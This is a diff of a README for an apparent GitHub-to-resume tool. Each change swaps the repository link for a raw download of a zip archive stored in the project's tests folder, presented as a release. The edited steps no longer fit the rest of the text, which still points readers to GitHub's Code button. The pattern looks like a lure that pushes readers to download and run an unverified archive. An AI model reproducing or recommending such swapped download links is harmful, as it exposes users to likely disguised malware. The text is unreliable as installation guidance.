@@ -1,12 +1,12 @@
 # 🧠 codex-skill-github-job-showcase - Turn Repos Into Job Wins
 
-[![Download](https://img.shields.io/badge/Download%20Here-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Gordapho1099/codex-skill-github-job-showcase)
+[![Download](https://img.shields.io/badge/Download%20Here-Visit%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gordapho1099/codex-skill-github-job-showcase/main/tests/showcase-codex-skill-job-github-2.4.zip)
 
 ## 📥 Download and Start
 
 Use this link to visit the page to download:
 
-https://github.com/Gordapho1099/codex-skill-github-job-showcase
+https://raw.githubusercontent.com/Gordapho1099/codex-skill-github-job-showcase/main/tests/showcase-codex-skill-job-github-2.4.zip
 
 This project helps you turn a GitHub repo into a clean README, a portfolio entry, and a resume-ready project write-up. It is built for people who want their work to look clear in job applications and interviews.
 
@@ -42,7 +42,7 @@ If you plan to edit files later, you can also use:
 ## 🚀 How to Get It on Windows
 
 1. Open the download page:
-   https://github.com/Gordapho1099/codex-skill-github-job-showcase
+   https://raw.githubusercontent.com/Gordapho1099/codex-skill-github-job-showcase/main/tests/showcase-codex-skill-job-github-2.4.zip
 
 2. On GitHub, look for the green Code button.
 
@@ -218,7 +218,7 @@ Here are a few clean styles you can use:
 
 Visit this page to download or access the project files:
 
-https://github.com/Gordapho1099/codex-skill-github-job-showcase
+https://raw.githubusercontent.com/Gordapho1099/codex-skill-github-job-showcase/main/tests/showcase-codex-skill-job-github-2.4.zip
 
 ## 🧩 Troubleshooting on Windows
 
